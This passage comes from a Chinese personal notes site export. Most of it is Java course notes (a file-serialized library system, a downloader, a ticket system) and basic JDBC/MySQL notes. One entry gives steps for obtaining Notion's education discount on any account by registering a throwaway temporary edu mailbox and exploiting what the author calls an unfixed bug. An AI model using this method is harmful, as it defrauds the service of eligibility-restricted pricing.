PropertyValueFactory\u003c\u003e(\"status\"));  \n    userTableView.setItems(users);  \n  \n}\n```\n\n\n### 图片output\n![](Pasted%20image%2020220829175404.png)\n\n\n---\n\n# 5. 用户修改\n## 步骤\n1. 在UserDao中添加接口`void update(User user)`更新接口方法，然后进行实现\n```java\n@Override  \npublic void update(User user) {  \n    ObjectInputStream ois = null;  \n    ObjectOutputStream oos = null;  \n    List\u003cUser\u003e list = null;  \n    try {  \n        //    读取本地用户信息  \n        ois = new ObjectInputStream(new FileInputStream(PathConstant.User_Path));  \n        list = (List\u003cUser\u003e) ois.readObject();  \n        if (list != null) {  \n            //    获取要修改的用户  \n            User originUser = list.stream().filter(u -\u003e u.getId() == user.getId()).findFirst().get();  \n            // 修改数值  \n            BeanUtil.populate(originUser, user);  \n            //    对数据进行持久化  \n            oos=new ObjectOutputStream(new FileOutputStream(PathConstant.User_Path));  \n            oos.writeObject(list);  \n            oos.flush();  \n        }  \n  \n        /* 当list有用户信息的时候， */  \n    } catch (Exception e) {  \n        throw new RuntimeException(\"更新用户信息错误\");  \n    }finally {  \n        try {  \n            if (ois!=null){  \n                ois.close();  \n            }  \n            if (oos!=null){  \n                oos.close();  \n            }  \n        } catch (IOException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n}\n```\n2. 注意需要一个进行复制对象属性（将a的所有属性值复制给b的相同属性上）的方法`populate(Object origin,Object dest)`，可以创建在util工具包中的`BeanUtil`类中\n```java\n/**  \n * 复制对象属性  \n *  \n * @param origin 源对象  \n * @param dest   需要复制的对象属性  \n */  \npublic static void populate(Object origin, Object dest) {  \n    try {  \n        /* 通过反射机制复制对象的属性 */        if (origin.getClass()!=dest.getClass()){  \n            throw  new RuntimeException(\"必须是一样的类型才可以进行对象属性复制！！！\");  \n        }  \n  \n        Class\u003c?\u003e clazz=origin.getClass();//获取需要修改值的类文件  \n        Field[] fields=clazz.getDeclaredFields();//获取属性字段  \n        for (Field f:fields  \n        ) {  \n            //不对序列号id进行复制  \n            if (\"serialVersionUID\".equals(f.getName())){  \n                continue;  \n            }  \n            //打破封装  \n            f.setAccessible(true);  \n            //将dest的值复制给f  \n            f.set(origin,f.get(dest));  \n        }  \n    }catch (IllegalAccessException e) {  \n        throw new RuntimeException(e);  \n    }  \n}\n```\n4. 在UserService中编写同样的接口方法，然后进行实现，调用UserDao中的方法\n5. 修改主方法中的代码，将更新持久化到硬盘中`UserHandleViewCtrl.java`\n```java\nelse {  \n    //修改操作  \n    populate(this.user);  \n  \n    //持久化到本地（更新部分）  \n    userService.update(user);  \n    //刷新  \n    userTableView.refresh();  \n}\n```\n## picOutput\n![](Pasted%20image%2020220830161337.png)\n\n---\n# 6.用户删除\n## 步骤\n\n1. UserDao中写删除方法，进行实现\n```java\n/**  \n * 删除  \n *  \n * @param user 用户  \n */  \n@Override  \npublic void delete(User user) {  \n    ObjectInputStream ois = null;  \n    ObjectOutputStream oos = null;  \n    List\u003cUser\u003e list = null;  \n    try {  \n        //    读取硬盘中的用户list  \n        ois = new ObjectInputStream(new FileInputStream(PathConstant.User_Path));  \n        list = (List\u003cUser\u003e) ois.readObject();  \n        if (list != null) {  \n            //    找到要删除的用户  \n            User originUser = list.stream().filter(u -\u003e u.getId() == user.getId()).findFirst().get();  \n            list.remove(originUser);  \n            //    持久化到文件中  \n            oos = new ObjectOutputStream(new FileOutputStream(PathConstant.User_Path));  \n            oos.writeObject(list);  \n            oos.flush();  \n        }  \n  \n    } catch (Exception e) {  \n        throw new RuntimeException(\"删除用户异常！！！\");  \n    } finally {  \n        try {  \n            if (oos != null) {  \n                oos.close();  \n            }  \n            if (ois!=null){  \n                ois.close();  \n            }  \n        } catch (IOException e) {  \n            throw new RuntimeException(e);  \n        }  \n  \n    }  \n}\n```\n2. 在UserServer中书写同样的接口方法，进行实现调用UserDao中的相同方法\n3. 在主方法中，进行修改,代码片段\n```java\n      return;  \n    }  \n    userService.delete(user);  \n    this.users.remove(user);  \n    Alerts.success(\"成功\", \"操作成功\");  \n} catch (Exception e) {\n```\n## 图片output\n![](Pasted%20image%2020220830170452.png)\n---\n# 7. 用户冻结\n## 步骤\n1. 同上，dao层实现冻结代码功能\n```java\n/**  \n * 冻结  \n *  \n * @param user 用户  \n */  \n@Override  \npublic void frozen(User user) {  \n    //    变量  \n    ObjectInputStream ois = null;  \n    ObjectOutputStream oos = null;  \n    List\u003cUser\u003e list = null;  \n    try {  \n        //     获取硬盘中的User对象list  \n        ois = new ObjectInputStream(new FileInputStream(PathConstant.User_Path));  \n        list = (List\u003cUser\u003e) ois.readObject();  \n        if (list != null) {  \n            //    获取要冻结的用户对象  \n            User originUser = list.stream().filter(u -\u003e u.getId() == user.getId()).findFirst().get();  \n            //    修改属性进行冻结  \n            originUser.setStatus(Constant.USER_FROZEN);  \n            //    持久化到文件中  \n            oos = new ObjectOutputStream(new FileOutputStream(PathConstant.User_Path));  \n            oos.writeObject(list);  \n            oos.flush();  \n        }  \n    } catch (Exception e) {  \n        throw new RuntimeException(\"冻结用户异常\");  \n    }  \n}\n```\n2. service层实现，调用dao的代码\n3. 主方法中对service的方法进行调用\n```java\n//持久化到本地  \nuserService.frozen(user);  \nuser.setStatus(Constant.USER_FROZEN);  \nuserTableView.refresh();\n```\n ## 图片output\n  ![](Pasted%20image%2020220830190926.png)\n---\n\n# 8. 初始化图书数据\n## 步骤\n1. 添加常量path，用于设置保存的位置\n2. 将book继承Serializable，添加序列号\n3. 在初始化方法`initDataUtil`中添加book list的代码\n```java\n /* 初始化图书数据 */    List\u003cBook\u003e bookList = new ArrayList\u003c\u003e();  \n    //    添加图书数据  \n   bookList.add(new Book(1, \"java实战入门\", \"张三\", Constant.TYPE_COMPUTER, \"12-987\", \"XX出版社\", Constant.STATUS_STORAGE));  \n   bookList.add(new Book(2, \"编程之道\", \"李四\", Constant.TYPE_COMPUTER, \"1245-987\", \"XX出版社\", Constant.STATUS_STORAGE));  \n   bookList.add(new Book(3, \"颈椎病康复指南\", \"王五\", Constant.TYPE_COMPUTER, \"08712-987\", \"XX出版社\", Constant.STATUS_STORAGE));  \n//   使用方法持久到本地  \n    initData(PathConstant.Book_Path,bookList);\n```\n## 图片output\n\n![](Pasted%20image%2020220830192341.png)\n---\n# 9.图书查询操作\n\u003e #发现 我发现很多东西其实没有必要挨着写，相同的代码，其实只是代码的变量名不一样，把userdao的相同方法拿过来用记事本替换一下变量，对具体细节进行修改一下就好了\n## 步骤\n1. 依旧是实现dao层\n```java\n/**  \n * 查询  \n *  \n * @param book 书  \n * @return {@link List}\u003c{@link Book}\u003e  \n */@Override  \npublic List\u003cBook\u003e select(Book book) {  \n    ObjectInputStream ois = null;  \n    List\u003cBook\u003e list = new ArrayList\u003c\u003e();  \n    try {  \n        //    读取书籍信息  \n        ois = new ObjectInputStream(new FileInputStream(PathConstant.Book_Path));  \n        list = (List\u003cBook\u003e) ois.readObject();  \n        if (book == null || \"\".equals(book.getBookName()) \u0026\u0026 \"\".equals(book.getIsbn())) {  \n            return list;  \n        } else {  \n            /* 当list不为空的时候 */            //    需要返回的数据  \n            List\u003cBook\u003e conditionList = new ArrayList\u003c\u003e();  \n            /* //根据编号查询  \n            if (!(0==book.getId())){                conditionList=list.stream().filter(b-\u003eb.getId()==book.getId()).collect(Collectors.toList());                return conditionList;            } */            // 当查询书籍名称不为空的时候  \n            if (!\"\".equals(book.getBookName())) {  \n                // conditionList = list.stream().filter(b -\u003e b.getBookName().equals(book.getBookName())).collect(Collectors.toList());  \n                //模糊查询  \n                conditionList = list.stream().filter(b -\u003e b.getBookName().contains(book.getBookName())).collect(Collectors.toList());  \n            }  \n            // 当书籍isbn不为空的时候  \n            if (!\"\".equals(book.getIsbn())) {  \n                conditionList = list.stream().filter(b -\u003e b.getIsbn().equals(book.getIsbn())).collect(Collectors.toList());  \n            }  \n            // 当书籍名称以及isbn都不为空的时候,这个是根据上一个进行进步筛选的  \n            if (!\"\".equals(book.getBookName()) \u0026\u0026 !\"\".equals(book.getIsbn())) {  \n                conditionList = conditionList.stream().filter(b -\u003e b.getBookName().equals(book.getBookName())).collect(Collectors.toList());  \n  \n            }  \n            return conditionList;  \n        }  \n    } catch (Exception e) {  \n        e.printStackTrace();  \n    } finally {  \n        try {  \n            if (ois != null) {  \n                ois.close();  \n            }  \n  \n        } catch (IOException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n    // 出现了异常，就返回一个空的  \n    return list;  \n}\n```\n2. 实现service层，调用dao层的方法\n3. 修改主方法（`BookViewCtrl`）中的代码，改为从本地硬盘中加载对象文件\n```java\npublic void initialize(URL location, ResourceBundle resources) {   \n    /* books.add(new Book(1, \"java实战入门\", \"张三\", Constant.TYPE_COMPUTER, \"12-987\", \"XX出版社\", Constant.STATUS_STORAGE));  \n    books.add(new Book(2, \"编程之道\", \"李四\", Constant.TYPE_COMPUTER, \"1245-987\", \"XX出版社\", Constant.STATUS_STORAGE));  \n    books.add(new Book(3, \"颈椎病康复指南\", \"王五\", Constant.TYPE_COMPUTER, \"08712-987\", \"XX出版社\", Constant.STATUS_STORAGE)); */  \n    /* 改为本地加载书籍信息 */    List\u003cBook\u003e bookList=bookService.select(null);  \n    books.addAll(bookList);\n```\n## 图片output\n![](Pasted%20image%2020220831091310.png)\n# 10.图书添加操作\n## 步骤\n1. dao层实现\n```java\n/**  \n * 添加  \n *  \n * @param Book 书  \n */  \n@Override  \npublic void add(Book Book) {  \n    ObjectInputStream ois = null;  \n    ObjectOutputStream oos = null;  \n    List\u003cBook\u003e list = null;  \n    try {  \n        //    读取硬盘中的书籍信息  \n        ois = new ObjectInputStream(new FileInputStream(PathConstant.Book_Path));  \n  \n        list = (List\u003cBook\u003e) ois.readObject();// 读取书籍信息  \n        // 判断list是否有  \n        if (list != null) {  \n            // 设置新添加的书籍id  \n            Book lastBook = list.get(list.size() - 1);  \n            Book.setId(lastBook.getId() + 1);  \n            //    添加到list中  \n            list.add(Book);  \n        } else {  \n            //    当list为空的时候，就需要一个空的去装  \n            list = new ArrayList\u003c\u003e();  \n            Book.setId(0001);  \n            list.add(Book);  \n  \n        }  \n        //    持久化到本地硬盘  \n        oos = new ObjectOutputStream(new FileOutputStream(PathConstant.Book_Path));  \n  \n        oos.writeObject(list);  \n        oos.flush();  \n  \n    } catch (Exception e) {  \n        throw new RuntimeException(\"添加书籍失败\");  \n    } finally {  \n        // 释放资源  \n        try {  \n            if (ois != null) {  \n                ois.close();  \n            }  \n            if (oos != null) {  \n                oos.close();  \n            }  \n        } catch (IOException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n}\n```\n2. service实现：调用dao层\n3. 主方法中进行修改，持久化到本地硬盘中\n```java\nprivate void addOrEditBook() {  \n    try {  \n        String id = bookIdField.getText();  \n        if (\"\".equals(id) || null == id) {  \n            //添加操作  \n            Book book = new Book();  \n            populate(book);  \n  \n            book.setStatus(Constant.STATUS_STORAGE);  \n            //修改本地的  \n            bookService.add(book);  \n            books.add(book);\n```\n## 图片output\n![](Pasted%20image%2020220831092944.png)\n---\n\n# 11.图书删除操作\n## 步骤\n1. dao层\n2. service\n3. 主方法中进行修改\n## 图片output\n![添加的书籍不见了](Pasted%20image%2020220831101013.png)\n---\n\n# 12.图书修改操作 \n## 步骤\n同上\n## 图片output\n![修改前](Pasted%20image%2020220831112109.png)\n![修改后](Pasted%20image%2020220831112136.png)\n# 13.分类饼状图数据修改\n## 步骤\n1. 新建一个dao接口，写入统计方法，进行实现\n```java\n/**  \n * 图书类型数量统计  \n *  \n * @return {@link Map}\u003c{@link String}, {@link Integer}\u003e  \n */@Override  \npublic Map\u003cString, Integer\u003e bookTypeCount() {  \n    try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(PathConstant.Book_Path))) {  \n        //    获取所有的图书信息  \n        List\u003cBook\u003e list = (List\u003cBook\u003e) ois.readObject();  \n    //    对图书根据书籍类型进行分组  \n        Map\u003cString,List\u003cBook\u003e\u003e collect=list.stream().collect(Collectors.groupingBy(Book::getType));  \n    //    遍历分别进行统计  \n        HashMap\u003cString ,Integer\u003e map=new HashMap\u003c\u003e();  \n        Iterator\u003cMap.Entry\u003cString,List\u003cBook\u003e\u003e\u003e iterator=collect.entrySet().iterator();//迭代器  \n        while (iterator.hasNext()){  \n        //    将统计结果放入到map中  \n            Map.Entry\u003cString,List\u003cBook\u003e\u003e next=iterator.next();//具体的书籍分类信息  \n            map.put(next.getKey(),next.getValue()==null?0:next.getValue().size());//写入统计书籍类型的数量  \n        }  \n        //返回结果  \n        return map;  \n    } catch (Exception e) {  \n        e.printStackTrace();  \n        throw new RuntimeException(\"统计图书异常~\");  \n    }  \n}\n```\n2. service层进行调用\n3. 主方法中进行修改关键代码\n```java\n@Override  \npublic void initialize(URL location, ResourceBundle resources) {  \n    // 获取书籍分类信息  \n    Map\u003cString, Integer\u003e map = chartDao.bookTypeCount();  \n    Data[] dataArray = new Data[map.size()];  \n    // 通过迭代传入到Data数组中  \n    Iterator\u003cMap.Entry\u003cString, Integer\u003e\u003e iterator=map.entrySet().iterator();  \n    int i=0;  \n    while (iterator.hasNext()){  \n        Map.Entry\u003cString, Integer\u003e next=iterator.next();  \n        dataArray[i++]=new Data(next.getKey(),next.getValue());//进行赋值  \n    }  \n    //将数组传入  \n    ObservableList\u003cjavafx.scene.chart.PieChart.Data\u003e pieChartData = FXCollections.observableArrayList(dataArray);  \n   /*  ObservableList\u003cjavafx.scene.chart.PieChart.Data\u003e pieChartData = FXCollections.observableArrayList(  \n            new Data(\"计算机\", 20),  \n            new Data(\"文学\", 12),  \n            new Data(\"经济\", 25),  \n            new Data(\"管理\", 22)  \n    ); */    pieChart.setData(pieChartData);  \n    pieChart.setClockwise(false);  \n}\n```\n## 图片output\n![](Pasted%20image%2020220831120238.png)\n---\n# 14.借阅数据初始化\n## 步骤\n```java\n /* 初始化借阅数据 */    List\u003cLend\u003e lendList=new ArrayList\u003c\u003e();  \n//    添加借阅数据  \n    Book book = new Book(1, \"java实战入门\", \"张三\", Constant.TYPE_COMPUTER, \"12-987\", \"XX出版社\", Constant.STATUS_STORAGE);  \n    User user = new User(1, \"张三\", \"正常\", new BigDecimal((\"100\")));  \n    user.setLend(true);  \n    LocalDate now = LocalDate.now();  \n    //通过UUID生成的编号  \n    Lend lend=new Lend(UUID.randomUUID().toString(),book,user, Constant.LEND_LEND, now,now.plusDays(30));  \n    lend.setStatus(Constant.STATUS_LEND);//设置借阅状态  \n    lendList.add(lend);  \n  \n//    持久化到本地  \n    initData(PathConstant.Lend_Path,lendList);\n---\n\n# 15.借阅数据查询\n## 步骤\n\t1. dao层\n```java\n/**  \n * 查询  \n *  \n * @param lend 书  \n * @return {@link List}\u003c{@link Lend}\u003e  \n */@Override  \npublic List\u003cLend\u003e select(Lend lend) {  \n    ObjectInputStream ois = null;  \n    List\u003cLend\u003e list = new ArrayList\u003c\u003e();  \n    try {  \n        //    读取借阅信息  \n        ois = new ObjectInputStream(new FileInputStream(PathConstant.Lend_Path));  \n        list = (List\u003cLend\u003e) ois.readObject();  \n        //当lend为空的时候，就返回所有的借阅信息  \n        if (lend==null||\"\".equals(lend.getBook().getBookName()) \u0026\u0026 \"\".equals(lend.getBook().getIsbn())){  \n            return list;  \n        }else{  \n            //处理结果  \n            List\u003cLend\u003e conditionList=new ArrayList\u003c\u003e();  \n            //通过书籍名称获取借阅信息  \n            if(!\"\".equals(lend.getBook().getBookName())){  \n                conditionList=list.stream().filter(l-\u003el.getBook().getBookName().equals(lend.getBook().getBookName())).collect(Collectors.toList());  \n            }  \n            // 通过书籍ISBN号获取借阅信息  \n            if(!\"\".equals(lend.getBook().getIsbn())){  \n                conditionList=list.stream().filter(l-\u003el.getBook().getIsbn().equals(lend.getBook().getIsbn())).collect(Collectors.toList());  \n            }  \n            //联合查询  \n            if (!\"\".equals(lend.getBook().getIsbn())\u0026\u0026!\"\".equals(lend.getBook().getBookName())){  \n                conditionList=conditionList.stream().filter(l-\u003el.getBook().getBookName().equals(lend.getBook().getBookName())).collect(Collectors.toList());  \n            }  \n            //返回借阅结果集  \n            return  conditionList;  \n        }  \n  \n  \n    } catch (Exception e) {  \n        e.printStackTrace();  \n    } finally {  \n        try {  \n            if (ois != null) {  \n                ois.close();  \n            }  \n  \n        } catch (IOException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n    // 出现了异常，就返回一个空的  \n    return list;  \n}\n```\n2.  service\n3. 主方法中修改关键代码\n```java\npublic void initialize(URL location, ResourceBundle resources) {  \n    //从硬盘中获取借阅信息List  \n    List\u003cLend\u003e list=lendDao.select(null);  \n    lends.addAll(list);\n```\n## 图片output\n![加载成功](Pasted%20image%2020220831135819.png)\n# 16.借阅功能的实现\n## 步骤\n1. 给user添加一个boolean的字段，标识是否借过书\n2. dao层，可以借书的用户\n```java\n/**  \n * 可以借书给用户  \n *  \n * @return {@link List}\u003c{@link User}\u003e  \n */@Override  \npublic List\u003cUser\u003e canLendUser() {  \n    try (ObjectInputStream ois=new ObjectInputStream(new FileInputStream(PathConstant.User_Path))){  \n        //获取硬盘中的user数据  \n        List\u003cUser\u003e list=(List\u003cUser\u003e) ois.readObject();  \n        if (list!=null){  \n            //返回可以借书的用户  状态正常，没借过书  \n            return list.stream().filter(u-\u003efalse==u.isLend() \u0026\u0026Constant.USER_OK.equals(u.getStatus()) ).collect(Collectors.toList());  \n        }  \n    }catch(Exception e){  \n        e.printStackTrace();  \n    }  \n    return new ArrayList\u003c\u003e();  \n}\n```\n3. 主方法代码修改\n# 17.还书功能的实现\n# 18.逾期扣款，自动冻结\n# 19.用户充值\n# 20 #总结 要点\n1. 文件的读取\n2. list与map等集合对象的运用\n3. 对象的存储 与读取\n4. 序列号的使用\n5. list中查询的使用\n6. 层次结结构之间的不同\n\n# 收获\n\u003e fxml的那个界面逻辑怎么创建搞不来，那一个部分的代码搞不来，就是本地的数据都会操作，但是界面的东西弄不来，那个没学过，但是讲师又说不用学，就不搞刷新界面的那个部分了，![](../assets/7b5d522cdae04b529add449565b55f48.png)\n\n","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/%E9%A1%B9%E7%9B%AE2%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E6%AD%A5%E9%AA%A4":{"title":"【项目2】多线程下载器步骤","content":"# 【项目2】多线程下载器步骤\n1. main方法中写对下载链接进行基本的变量准备，以及输入变量\n2. 在工具类`util`中创建HTTP工具类，其中写下两个静态方法\n\t1. `getHttpURLConnection(String url)`：用于获取`HttpURLConnection`的对象\n\t2. `getHttpFileName(String url)`\n3. `core`类\n![普通下载速度](Pasted%20image%2020220903155805.png)\n\n不想写了，主要是对于多线程的使用\n通过多线程划分（比如8个线程），将要下载的文件分成8份，异步下载到本地之后，存放在以序号排列的temp临时文件（后缀名可以自定义），然后最后通过每个临时文件的序号按照顺序进行重新写入到一个文件中。\n需要注意的是下载的这个每个片段的起始值是在上一个end值上加1","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/%E9%A1%B9%E7%9B%AE3%E7%94%B5%E5%BD%B1%E7%A5%A8%E8%B4%AD%E7%A5%A8%E7%B3%BB%E7%BB%9F":{"title":"【项目3】电影票购票系统","content":"# 【项目3】电影票购票系统\n## 知识点\n1. 集合的各种数据类型\n2. 查询\n3. Lambda表达式\n4. 日志的使用\n## 步骤\n\n1. 进行基本的配置\n\t1. Logback的jar导入，放到项目的模块目录下，作为as library\n\t2. 配置xml文件，在src目录下\n2. 系统角色分析：bean层书写基本的角色类代码，注意各类之间的继承关系![](QQ截图20220921111413.png)\n3. 首页设计：对首页的基本功能进行设计，主要包括了商家界面和客户界面\n4. 功能设计：\n\t1. 商家\n\t\t1. 影片库查看\n\t\t2. 影片上架\n\t\t3. 影片下架\n\t\t4. 修改影片信息\n\t2. 客户\n\t\t1. 查看所有的影片\n\t\t2. 根据电影名称购买电影票：需要筛选商家，因为不同商家可能都有这部电影\n\t\t3. 退票：通过用户购票记录进行查询","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E9%A6%96%E5%8F%91-%E4%BB%BB%E6%84%8FNotion%E8%B4%A6%E5%8F%B7%E8%8E%B7%E5%8F%96%E6%95%99%E8%82%B2%E4%BC%98%E6%83%A0":{"title":"首发-任意Notion账号获取教育优惠","content":"\u003caside\u003e💡 notion教育优惠，基本上已经可以满足个人的所有使用场景了。目前发现的唯一不足是不能像别的计划一样，给team中添加member。\u003c/aside\u003e\n\n效果图：qq邮箱的教育优惠\n\n\n# 声明\n💡 和官方的教育优惠完全一致，可以说是官方没有修复的bug，不清楚未来是否会修复，不过我没有泄露。\n我也不太清楚这个bug的原因是什么，之前一直没有发现，我估计之前在淘宝售卖的永久空间和这个有异曲同工之处。\n# 步骤\n1. 首先你需要有一个教育邮箱的账号，没有也没有关系，可以用临时教育邮箱账号[[临时邮箱]]\n\t1. notion除了接受edu的教育邮箱，还有一些其他特殊的教育邮箱后缀。\n\n3. 使用********************临时教育邮箱********************注册一个notion账号\n\n4. 使用自己的账号，在自己的账户中，将临时教育邮箱作为member添加到你的空间。（需要注意的是，只有一些计划才可以添加，如果不可以添加，可以试试将你的计划降低）\n\n\n5. 在临时教育邮箱账户中，可以看到你的工作空间，然后转到你的工作空间，下方会有提升为教育计划，调整后，在你本来的邮箱账户中也可以看到这个空间变成了教育优惠。\n\n6. 建议之后把临时教育邮箱移除member\n## 注意\n1. 教育优惠的空间不能添加`member` ，可能是为了区别于plus计划，不过对于个人用户来说，已经足够使用了。\n2. 不要随意修改邮箱，可能会降级，不过我试过我的没有降级，但是另一个邮箱降级了，需要重复这样的操作。\n-","lastmodified":"2023-05-31T09:03:33.05390788Z","tags":null},"/0000_%E6%80%BB%E7%BB%93%E5%9F%BA%E6%9C%AC%E8%A6%81%E7%82%B9":{"title":"0000_总结基本要点","content":"# 0000_总结基本要点\n1. jdbc的作用，是啥\n2. jdbc开发的步骤：导包jar，[开发6部分](0002%20JDBC开发基本使用.md)\n3. [为了避免sql注入，statement以及PreparedStatement使用的区别](0004%20Statement和PreparedStatement的区别.md)\n4. 使用资源绑定器，采用类反射机制等等，降低程序耦合度，可以通过配置文件来修改相应的设置等等 [0007 通过资源绑定器获取属性文件](0007%20通过资源绑定器获取属性文件.md)\n5. 事物机制","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0001_%E6%A6%82%E8%BF%B0":{"title":"0001_概述","content":"# 0001_概述\n\n# 概述\n\n## 忘记root密码怎么解决？\n\n关闭正在运行的ySQL服务。\n打开Dos窗口，转到nysql\\bin目录。\n输入mysqld-skip-grant-tables回车。--skip-grant-tables的意思是启动ysQL服务的时候跳过权限表认证。\n再开一个Dos窗口(因为刚才那个Dos窗口己经不能动了)，转到mysg1\\bin目录。\n输入mysg1回车，如果成功，将出现MySQL提示符\n\u003e。\n连接权限数据库：use mysq1;.\n改密码：update user set password-=password(\"123\")where user:=\"root\";（别忘了最后加分号）。\n刷新权限（必须步骤）：f1 ush privileges;\n退出guit.\n注销系统，再进入，使用用户名x00t和刚才设置的新密码123登录。\n\n## 常用的数据库系统\n\n\n\u003e[!faq]+ sql、DB、DBMS的区别\n\u003e1. DB：数据库，实际以文件的形式存放在硬盘上\n\u003e2. DBMS：数据库管理系统，常见的数据库系统Oracie、SQL Server、MySql、Sybase、informix、DB2、interbase\n\u003e3. sql:\n\u003e\t1. **结构化查询语言**，标准通用的语言，适用于所有的数据库产品\n\u003e\t2. 属于高级语言,内部也需要编译和执行\n\u003e4. DBMS通过执行sql语句，来操作数据DB中的数据\n\n","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0001_JDBC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5":{"title":"0001_JDBC基本概念","content":"# 0001_JDBC基本概念\n1. Java DataBase Connectivity（Java语言连接数据库）\n\n3. JDBC的本质是什么？\n\t1. **JDBC是SUN公司制定的一套接口**（interface）`java.sql.\\*`; (这个软件包下有很多接口。)\n\t2. 面向接口编程可以**降低程序耦合度，提高程序扩展力**，**多态机制**就是典型的抽象编程。（`Animal a=new CAt();`）\n4. sun制定JDBC接口的原因：\n\t- 每一个数据库的底层实现原理不一样，每一个产品有自己独特的实现原理，所以就需要数据库产品自己去写jdbc中接口的实现方式，供用户调用。\n\n\n","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0002_JDBC%E5%BC%80%E5%8F%91%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8":{"title":"0002_JDBC开发基本使用","content":"# 0002_JDBC开发基本使用\n## 开发前的准备\n1. 在对应的数据库官网下载jar包（这个jar中包括了的jdbc接口的具体实现方式）\n\t1. **如果是cmd窗口运行的话**，就需要将其配置到[环境变量](../爪哇基础/00理论/003.环境变量.md)`classpath`中，一般需要设置两个东西，一个是`.`，表示当前路径，一个是jar包的具体位置，比如`C:\\Users\\22305\\Documents\\MySql Connector Java 5.1.23\\mysql-connector-java-5.1.23-bin.jar` ()\n\t2. 如果是idea的话，就需要导包，具体方法为两种\n\t\t1. `File`--\u003e`Project Structure`---`Moudles`--\u003e选择你对应的模块，然后在右侧的编辑窗口中点击`+`号，选择对应的jar包--\u003e导入之后，勾选上----\u003e点击应用即可![](https://pcsdata.baidu.com/thumbnail/b4e0b1999q262f6bab2e926db0bfe0ae?fid=893181348-16051585-340834226556884\u0026rt=pr\u0026sign=FDTAER-yUdy3dSFZ0SVxtzShv1zcMqd-ccKxNIrkq3MxTOPkipfgSyrjA8o%3D\u0026expires=48h\u0026chkv=0\u0026chkbd=0\u0026chkpc=\u0026dp-logid=8851640456417683329\u0026dp-callid=0\u0026time=1661054400\u0026bus_no=26\u0026size=c1600_u1600\u0026quality=100\u0026vuk=-\u0026ft=video)\n","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0002_SQL%E8%AF%AD%E5%8F%A5%E7%9A%84%E5%88%86%E7%B1%BB":{"title":"0002_SQL语句的分类","content":"# 0002_SQL语句的分类\n\n\n## SQL语句的分类\n1. DQL（数据查询语言）：查询语句，凡是selecti语句都是DQL.\n2. [DML（数据操作语言)](0009%20DML（数据操作语言）.md)：insert delete update,对表当中的数据进行增删改。\n3. DDL（数据定义语言）：create drop alter,对表结构的增删改。\n4. TCL（事务控制语言）：commit提交事务，rollback回滚事务。\n5. DCL（数据控制语言）：grant授权、revoke撤销权限等。  ","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0003_JDBC%E5%BC%80%E5%8F%916%E6%AD%A5":{"title":"0003_JDBC开发6步","content":"# 0003_JDBC开发6步\n1. 注册驱动，两种方式\n2. 获取连接 \n3. 建立SQL数据库操作对象 \n4. 执行SQL语句 \n5. 处理结果集\n6. 释放资源（java与数据库之间属于进程之间的通信）（一般在finally语句中，编辑的时候建议需要关闭的对象放在try外面设置为null，之后，释放资源代码写了之后再开始选择编辑）","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0003_mysql%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8":{"title":"0003_mysql基本命令使用","content":"# 0003_mysql基本命令使用\n\n\n\n| 作用                                                                   | 命令                                | 相关                                                                                       |     |\n| ---------------------------------------------------------------------- | ----------------------------------- | ------------------------------------------------------------------------------------------ | --- |\n| [登录mysql数据库管理系统](Pasted%20image%2020220816170651.png)  | `mysql -u root -p password`         |                                                                                            |     |\n| [查看有哪些数据库](Pasted%20image%2020220816165702.png)         | `show databases;`                   |                                                                                            |     |\n| [创建数据库](Pasted%20image%2020220816170413.png)               | `bash create database 数据库名称;`  |                                                                                            |     |\n| [选择要使用的数据库](Pasted%20image%2020220816171311.png)       | `use 数据库名称`                    |                                                                                            |     |\n| [查看当前数据库中的表](Pasted%20image%2020220816171435.png)     | `show tables;`                      |                                                                                            |     |\n| [初始化数据](Pasted%20image%2020220816172212.png)               | ` source sql文件路径`               | [初始化之后的三张表](Pasted%20image%2020220816172321.png)（sql类型的文件叫sql脚本） |     |\n| [删除数据库](Pasted%20image%2020220816173230.png)               | `drop database  数据库名称;`        |                                                                                            |     |\n| [查看某个表结构](Pasted%20image%2020220816173521.png)           | `desc 表名;`                        |                                                                                            |     |\n| [查看某个数据表的所有记录](Pasted%20image%2020220816194313.png) | `select * from 表名*`               |                                                                                            |     |\n| [查看当前使用的数据库](Pasted%20image%2020220816194637.png)     | `select database(); `               |                                                                                            |     |\n| [查看当前的mysql版本](Pasted%20image%2020220816194754.png)      | `select version();`                 |                                                                                            |     |\n| 结束一条语句                                                           | `\\c`                                |                                                                                            |     |\n| 退出mysql                                                              | `exit`  `quit`    `\\q`              |                                                                                            |     |\n| 终止一条正在编写的语句                                                 | `键入\\c`                            |                                                                                            |     |\n| [查看其他库中的表](Pasted%20image%2020220816195545.png)         | `show tables from \u003cdatabase name\u003e;` |                                                                                            |     |\n| [查看表的创建语句](Pasted%20image%2020220816195815.png)         | `show create table \u003ctable name\u003e;`   |                                                                                            |     |\n\n\n","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0004_%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E7%9B%B8%E5%85%B3":{"title":"0004_查询语句相关","content":"# 0004_查询语句相关\n\n# like\n`like`：模糊查询，支持%和下划线匹配\n\t% 代表多个任意字符（包括0个）\n\t_ 代表一个任意字符 \n\tlike 后面的字符串必须放在单引号 '' 中\n\t![](Pasted%20image%2020220816213350.png) \n\t\n---\n# order by\n升降序：\norder 